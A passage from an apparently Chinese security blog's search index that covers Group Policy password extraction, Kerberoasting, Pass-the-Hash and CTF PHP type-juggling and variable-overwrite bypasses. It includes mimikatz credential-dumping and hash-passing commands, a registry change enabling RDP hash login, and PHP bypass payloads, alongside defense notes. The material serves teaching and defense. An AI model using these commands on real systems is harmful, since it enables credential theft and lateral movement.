以明文形式存储为 xml、ini、inf 等文件 对域内所有用户开放读权限 ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:2","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"1.3 组策略的更新 客户端每 90 分钟主动获取一次组策略，检查组策略是否发生变更 客户端使用 gpupdate /force 强制立即检查组策略 参数可以分为主机和用户， gpupdate /force /target:computer ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:3","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"1.4 组策略的下发与获取 kerberos 协议认证 LDAP 协议检索 SMB 协议下载 组策略的查询原理 LDAP 检索所有的组策略，哪些属于自己的查询策略，服务器决定需要返回哪些策略(版本号是决定的重要因素) ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:1:4","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"2 组策略密钥攻防 ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:2:0","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"2.1 组策略中的口令明文 通过 VB 脚本部署登录脚本 在 2003 之前较为常见，现已废弃。 ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:2:1","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"2.2 组策略中的口令密文 微软在 windows 2008 中发布了GPP（Group Policy Preferences），KB943729，在 windows 2016 上已禁用。 在某些场景存储使用凭据： 映射驱动(Drivers.xml) 创建/更新服务(Services.xml) 创建本地用户 计划服务(ScheduledTasks.xml) 数据源(DataSources.xml) 更改本地Administrator密码 打印机配置(Printers.xml) 以使用组策略创建本地用户为例： win 2003 win 2008 组策略内容： 明文密码由 AES 加密，但是密钥固定： ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:2:2","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"2.3 破解口令密文 利用 PowerSploit 中的 Get-GPPPassword 获取组策略中的口令： Get-GPPPassword ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:2:3","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"3 利用组策略攻击客户端 向客户端下发组策略： ","date":"2019-05-02","objectID":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/:3:0","tags":["域安全","内网渗透"],"title":"域环境中的组策略安全测试","uri":"/2019/05/%E5%9F%9F%E7%8E%AF%E5%A2%83%E4%B8%AD%E7%9A%84%E7%BB%84%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95/"},{"categories":["内网渗透"],"content":"Kerberoasting 攻击原理及实验","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"Kerberoasting 攻击 ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:0:0","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1 背景 Kerberoasting 攻击是 Tim Medin 在 DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin 同时发布了配套的攻击工具 kerberoast。此后，不少研究人员对 Kerberoasting 进行了改进和扩展，在 GitHub 上开发发布了大量工具，使得 Kerberoasting 逐渐发展成为域攻击的常用方法之一。 ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:1:0","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"2 原理 kerberos 协议的认证授权过程，3 次涉及使用不同账户的 NTLM 作为密钥加密数据 使用域用户的 NTLM 加密认证请求票据 KDC 使用 Krbtgt 账号的 NTLM 加密认证后的票据 TGT KDC 使用运行服务的服务账号的 NTLM 加密授权票据 TGS Kerberos 使用公开的对称加密算法 y = f(x, key) 为已知的对称加密算法，如 rc4_hmac_nt 等。 x 为待加密的数据，包含时间戳，其它为固定格式的内容； key 为加密密钥，即 NTLM; y 为加密后的密数据。 如果能从 Kerberos 域网络中获取 y，则根据已知算法，使用不同的 f 可推算出不同的 x。 由于 x 中包含简单易辨的时间戳，所以通过时间戳可快速判定数据解密是否正确，从而判定使用的 key 是否为要寻找的口令。 key 越简单、加密算法 f 强度越低，被破解的概率越大，因此需要寻找具有简单 key 的账号，以及使用较低强度的加密算法 f。 ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:2:0","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3 账号类型 在域内主要有主机账号、用户账号、服务账号(SPN 注册在域用户账号下) 等 3 种主要账号类型 主机账号的口令由系统随机设置，几乎不能破解，而且每 30 天自动变更一次 用户账号的口令复杂度由策略而定，在复杂度要求较高的域内，破解难度较大。 ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:3:0","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3.1 服务账号的口令存在很大的特殊性 口令在应用软件安装时往往自动设定，复杂度往往较为简单 口令几乎不会更改，因为大部分应用软件没有提供修改服务账号的功能和接口，例如运行 MS SQL Server 服务的 sqlsvc 账号等 服务账号基本满足口令复杂度较低这个条件，可以作为破解的对象 要想达成破解条件，还需要获取加密后的数据，则需获取服务账号的密数据 由于 TGS 由服务账号的 NTLM 加密，因此获取访问服务的 TGS 即可获取密数据，即 Kerberos 协议中的第 4 步。 根据 Kerberos 协议，任何用户均可以向域服务器申请访问某个服务 服务可以不在线，只要该服务在域中注册了 SPN(Service Principal Name) 即可。 ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:3:1","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4 SPN ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:4:0","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4.1 SPN 相关概念 SPN 是服务器上所运行服务的唯一标识，每个使用 Kerberos 的服务都需要一个 SPN SPN 分为两种，一种注册在 AD 上机器帐户(Computers)下，另一种注册在域用户帐户(Users)下 当一个服务的权限为 Local System 或 Network Service，则 SPN 注册在机器帐户(Computers)下 当一个服务的权限为一个域用户，则 SPN 注册在域用户帐户(Users)下 SPN 的格式为 serviceclass/host:port/servicename 其中 serviceclass 表示服务的种类，例如 www 表示web服务; host 尽量用 FQDN 表示; 端口如果是知名端口，可以省略。 ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:4:1","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4.2 查询 SPN SPN 存在于账号的属性中，因此可以通过查询所有账号的属性，遍历域内所有 SPN 服务。因为主机账号的口令几乎不能破解，所以只查询用户账号的 SPN。 系统提供了 PowerShell 模块供查询，PowerViewer 对模块进行了封装，提供 Get-DomainUser -SPN 命令，可遍历域内所有的用户账号的 SPN。 Win7 和 Windows Server 2008 自带的工具 setspn.exe -q */* 在一些域中，当一些服务不再运行或者停止服务后，这些服务账号可能仍然遗留在域中，由于服务的运行与否不影响我们获取 TGS，因此这些不存在的 SPN 仍然适用于 Kerberoasting。 服务账号中有些权限较高，例如有些特殊的服务需要具备域管理员权限的服务账号才能运行正常，因此可以在查询 SPN 时加以标记和筛选，作为重点攻击的对象。方法是在使用 Get-DomainUser -SPN 命令时，添加 AdminCount 参数，表示具备高权限。 ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:4:2","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"5 攻击流程 获取域内的服务账号与所运行的服务进行对应关系 需要获取访问这些服务的 TGS，从而获取由服务账号 NTLM 加密的加密数据 Mimikatz 提供了该功能，通过 Kerberos 模块的 ask 命令可以获取。 使用 Mimikatz 每次只能申请获取一个 TGS，impacket 工具包提供了批量获取的方法，可一次获取域内所有 SPN 的 TGS，供离线批量破解。 微软为了解决系统新旧版本兼容性问题，每个 Windows 系统会支持多种加密算法，例如 AES、DES、RC4、MD5 等。在 Windows 2003、Windows 2000 系统中，主要采用 RC4、MD5、HMAC_MD5 等算法，这些算法相对比较容易破解。所以在选择破解重点时尽量选取运行在这些系统上的服务 有多种方式迫使系统选择使用强度较低的加密算法。现在比较容易破解的算法是 RC4_HMAC_NT 算法，在获取 TGS 时，可以诱使域服务器采用该算法进行加密。 Kerberoasting 攻击的所有条件 密数据 算法 口令字典库 使用 Tim Medin 的 kerberoast 工具破解获取口令，当然还有算法更快的 HashCat 工具。下载解压 kerberoast 工具后，使用 tgsrepcrack.py wordlist.txt tgs.kirbi 进行破解，其中 wordlist.txt 是字典文件，tgs.kirbi 是前面获取的 TGS。破解的概率和时间依赖于口令复杂度、字典以及机器的性能。 ./tgsrepcrack.py wordlist.txt test.kirbi ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:5:0","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"6 防御 Kerberoasting 攻击的主要前提是口令复杂度较低、加密算法强度较弱 对抗 Kerberoasting 攻击也需从这 2 方面开展 提高服务账号的口令复杂度; 尽量将域内的服务器系统升级至少至 windows2008 系统，应用 AES256 高难度的加密算法 检测 Kerberoasting 攻击比较难，因为所有在线操作都是合法正常的操作，不过仍然有迹可循。例如批量获取 TGS 是一个特征，低强度的加密算法是一个特征，可以从这两方面着手进行检测是比较有效的检测思路。 ","date":"2019-04-30","objectID":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/:6:0","tags":["域安全","内网渗透"],"title":"Kerberoasting 攻击","uri":"/2019/04/kerberoasting-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"PTH(Pass The Hash) 攻击原理及实验","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"PTH(Pass The Hash) 攻击 ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:0:0","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"1 概述 获取一台主机的本地管理员组成员账号的口令 NTLM 后，不需破解获取口令明文，使用 PTH 方式，将管理员账号及 NTLM 注入当前会话作为凭据，利用该凭证可以渗透获取周围主机的管理权限 对方主机需存在相同的账号，且是管理员组成员 在 Windows NT 5.x 系统中，管理员组账号的网络登录均能获取系统管理权 在 Windows NT 6.x 系统及更高的版本中，管理员组(SID非500)账号的网络登录不能获取系统管理权限，administrator(SID为500)账号的网络登录能获取系统管理权 这类攻击适用于： 域/工作组环境 可以获得 hash，但是条件不允许对 hash 爆破 内网中存在和当前机器相同的密码 ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:1:0","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"2 UAC 用户帐户控制 (User Account Control) 是 Windows Vista（及更高版本操作系统）中一组新的基础结构技术，可以帮助阻止恶意程序（有时也称为\"恶意软件\"）损坏系统，同时也可以帮助组织部署更易于管理的平台。 使用 UAC，应用程序和任务总是在非管理员帐户的安全上下文中运行，但管理员专门给系统授予管理员级别的访问权限时除外。UAC 会阻止未经授权应用程序的自动安装，防止无意中对系统设置进行更改。 用户帐户控制(UAC)是新版 Windows 的核心安全功能，也是其最常被人误解的众多安全功能当中的一种。 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\FilterAdministratorToken，UAC就是通过上面的注册表键值来判断，默认设置为 0。如果设置为 1，则 SID 为 500 的管理员也不能通过网络登录的方式获取高权限。 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\LocalAccountTokenFilterPolicy，如果在注册表中有这个键值，并且设置为 1，则所有的管理组成员都可以通过网络登录获取高权限。且管上面的一个表项 FilterAdministratorToken 的值。 ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:2:0","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3 攻击 mimikatz 的 pth 功能需要本地管理员权限，这是由它的实现机制决定的，需要先获得高权限进程 lsass.exe 的信息 对于 8.1/2012r2，安装补丁KB2871997 的 Win 7/2008r2/8/2012，可以使用 AES keys 代替 NT hash 使用 mimikatz 先获取 hash: privilege::debug sekurlsa::logonpasswords 得到 hash 后 ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:3:0","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3.1 工作组 sekurlsa::pth /user:administrator /domain:workgroup /ntlm:ccef208c6485269c20db2cad21734fe7 微软也对 pth 打过补丁，然而在测试中发现，在打了补丁后，常规的 Pass The Hash 已经无法成功，唯独默认的 Administrator (SID 500) 账号例外，利用这个账号仍可以进行 Pass The Hash 远程 ipc 连接。 ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:3:1","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"3.2 域内用户 前提是：域用户为本地管理组成员 sekurlsa::pth /user:eviluser /domain:adsec.com /ntlm:ccef208c6485269c20db2cad21734fe7 域内用户不受补丁影响。 ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:3:2","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"4 KB2871997 Changes to this feature include: prevent network logon and remote interactive logon to domain-join ed machine using local accounts… 安装 KB2871997 补丁后，其他方面并没有太多的变化 。补丁会给本地账号添加一个 S-1-5-113 的 SID，为管理组中的本地账号添加一个 S-1-5-114 的 SID，这样方便通过域策略进行管理，例如从域策略中全面禁止这类账号的网络登录。 ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:4:0","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"5 针对 RDP 的 hash 传递攻击 说起 hash 传递攻击（pth），想到一般的都是 psexec wce mimikatz 等直接执行命令。 本节绍了一种利用 mimikatz + NThash 来启动 mstsc.exe 实现远程登陆 windows 桌面的方法，对不能执行命令又破解不出密码的环境有很大的帮助。 其原理（条件）是远程目标需要使用受限管理模式（Restricted Admin Mode），因为此模式下支持 kerberos 认证，所以能使用 hash 来登陆。 sekurlsa::pth /user:\u003cuser name\u003e /domain:\u003cdomain name\u003e /ntlm:\u003cthe user's ntlm hash\u003e /run:\"mstsc.exe /restrictedadmin\" 如果受限管理模式被禁用，使用如下命令开启： mimikatz.exe \"sekurlsa::pth /user:\u003cuser name\u003e /domain:\u003cdomain name\u003e /ntlm:\u003cthe user's ntlm hash\u003e /run:powershell.exe\" 在弹出的 powershell 窗口修改注册表： Enter-PSSession -Computer \u003cTarget\u003e New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\Lsa\" -Name \"DisableRestrictedAdmin\" -Value \"0\" -PropertyType DWORD -Force ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:5:0","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["内网渗透"],"content":"6 防御 HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\ Windows\\CurrentVersion\\Policies\\System\\FilterAdministratorToken，系统中一个有 Admin ApprovalMode，UAC 就是通过上面的注册表键值来判断，默认设置为 0。如果设置为 1，则 SID 为 500 的管理员也不能通过网络登录的方式获取高权限。 ","date":"2019-04-29","objectID":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/:6:0","tags":["域安全","内网渗透"],"title":"PTH(Pass The Hash) 攻击分析","uri":"/2019/04/pthpass-the-hash-%E6%94%BB%E5%87%BB/"},{"categories":["常用","渗透测试","代码审计"],"content":"CTF 中的 PHP 代码审计相关整理","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"CTF 中的 PHP 代码审计 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:0:0","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"1 PHP 弱类型问题 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:0","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"1.1 原理 双等于号： 如果类型转换后 $a 等于 $b 三等于号： 全等于 True 如果 $a 等于 $b，并且它们的类型也相同 如果一个数值和一个字符串比较，那么会将字符串转换成数值 常见的比较结果： '' == 0 == false '123' == 123 'abc' == 0 '123a' == 123 '0x01' == 1 '0e123456789' == '0e987654321' false == 0 == NULL == '' NULL == false == 0 true == 1 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:1","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"1.2 实例 1.2.1 MD5 等 hash 函数相关题目 1.2.1.1 DEMO 1 Payload：url?param1=QNKCDZO\u0026param2=aabg7XSs 1.2.2.2 DEMO 2 Payload：url?param1[]=1\u0026param2[]= 1.2.2.3 DEMO 3 经过 String 强制类型转换后，当传入数组时，返回值为 Array fail，无法绕过，因此，采用 MD5 碰撞的形式。 工具：fastcoll Payload： 1.2.2.4 DEMO 4 Payload：url?name[]=1\u0026password[]= 1.2.2.5 DEMO 5 - MD5 与 SQL 注入的融合 Payload：url?password=ffifdyop 1.2.2 JSON 相关题目 \u003c?php highlight_file(__FILE__); include \"flag.php\"; if(isset($_POST['message'])) { $message = json_decode(_$POST['message']); if($message-\u003ekey == $key) { echo $flag; } else { echo \"fail\"; } } else { echo \"~~~~\"; } ?\u003e 原理：字符串 flag{xxx} 和数字 0 比较，结果为 True Payload：url?message={\"key\":0} 1.2.3 SWITCH 相关题目 原理：如果 switch 是数字类型的 case 判断时，switch 会将其中的参数转换为 int 类型。switch 判断时为双等于类型 \u003c?php highlight_file(__FILE__); $i = \"3nanme\"; switch ($i) { case 0: case 1: case 2: echo \"this is two\"; break; case 3: echo \"flag\"; break; } ?\u003e 1.2.4 STRCMP 相关题目 原理：利用 strcmp 中的参数为数组，返回值为 NULL，在非严格比较的情况下与 0 相等。 \u003c?php highlight_file(__FILE__); include \"flag.php\"; if(isset($_POST['password'])) { if(strcmp($_POST['password'], $password) == 0) { echo \"Right!!!login success\"; echo $flag; exit(); } else { echo \"Wrong password..\"; } } ?\u003e Payload：url?password[]= 1.2.5 in_array 函数 \u003c?php highlight_file(__FILE__); $array=[0, 1, 2, '3']; var_dump(in_array('abc', $array)); var_dump(in_array('1bc', $array)); var_dump(in_array(3, $array)); 返回结果为：true、true、true 1.2.6 array_search 函数 在数组中搜索给定的值，如果成功则返回首个相应的键名。 \u003c?php highlight_file(__FILE__); $array=[0, 1, 2, '3']; var_dump(array_search('abc', $array)); var_dump(array_search('1bc', $array)); var_dump(array_search(3, $array)); var_dump(array_search('3', $array)); 返回结果为：0、1、3、3 \u003c?php if (!is_array($_GET['test'])) { exit(); } $test = $_GET['test']; for ($i = 0; $i \u003c count($test); $i++) { if ($test[$i] === \"admin\") { echo \"error\"; exit(); } $test[$i] = intval($test[$i]); } if (array_search(\"admin\", $test) === 0) { echo \"flag\"; } else { echo \"false\"; } Payload：url?test[0]=0 1.2.7 strpos 函数 \u003c?php var_dump(strpos('abcd', 'a')); // int(0) var_dump(strpos('abcd', 'a') == false); // bool(true) ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:1:2","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"2 变量覆盖问题 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:0","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"2.1 extract 函数 demo： \u003c?php highlight_file(__FILE__); include \"flag.php\"; extract($_GET); if(isset($gift)) { $content = trim(file_get_contents($flag)); if($gift == $content) { echo $trueflag; } else { echo \"Oh...\"; } } ?\u003e 让 file_get_content() 返回值为空，即可绕过。 Payload：?gift=\u0026flag= ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:1","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"2.2 遍历初始化变量 由于 php 中可以使用 $ $ 声明变量，因此存在遍历数组时可能会覆盖原来的值 \u003c?php highlight_file(__FILE__); $a = \"helloworld\"; echo $a; echo \"$a\"; echo \"\u003cbr /\u003e\" foreach($_GET as $key =\u003e $value) { $$key = $value; } echo \"$a\"; ?\u003e $key 与 $value 都可控，因此修改 $a 变量的点在代码第 8 行处，让 $key=a，$$key=$a，$value 为想要修改的值 Payload：url?a=afterChange Demo： \u003c?php highlight_file(__FILE__); include \"flag.php\"; $_403 = \"Access Denied\"; $_200 = \"Welcome Admin\"; if($_SERVER[\"REQUEST_METHOD\"] != \"POST\") { die(\"BugsBunnyCTF is here:p...\"); } if (!isset($_POST[\"flag\"])) { die($_403); } foreach ($_GET as $key =\u003e $value) { $$key = $$value; } foreach ($_POST as $key =\u003e $value) { $$key = $value; } if($_POST[\"flag\"] !== $flag) { die($_403); } echo \"This is your flag : \". $flag . \"\\n\"; die($_200); ?\u003e Payload：url?_200=flag + post：flag=123 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:2","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 代码审计","uri":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"categories":["常用","渗透测试","代码审计"],"content":"2.3 parse_str 函数 Demo： \u003c?php include \"flag.php\"; if(empty($_GET['id'])) { show_source(__FILE__); die(); } else { include(\"flag.php\"); $a = \"www.OPENCTF.com\"; $id = $_GET['id']; @parse_str($id); if($a[0] != \"QNKCDZO\" \u0026\u0026 md5($a[0]) == md5(\"QNKCDZO\")) { echo $flag; } else { exit(\"其实很简单并不难!\"); } } ?\u003e Payload：url?id=a[0]=s878926199a 技巧 由于 PHP 的变量名不能带「点」和「空格」，因此在 parase_str 函数中，他们会被转化成下划线。 \u003c?php $a = $_GET[\"a_a\"]; echo $a; 当传入的参数名为：url?a.a=123 时，会被转化成 a_a，因此可以正常输出内容 ","date":"2019-03-17","objectID":"/2019/03/ctf%E4%B8%AD%E7%9A%84php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/:2:3","tags":["常用","渗透测试","CTF"],"title":"CTF 中的 PHP 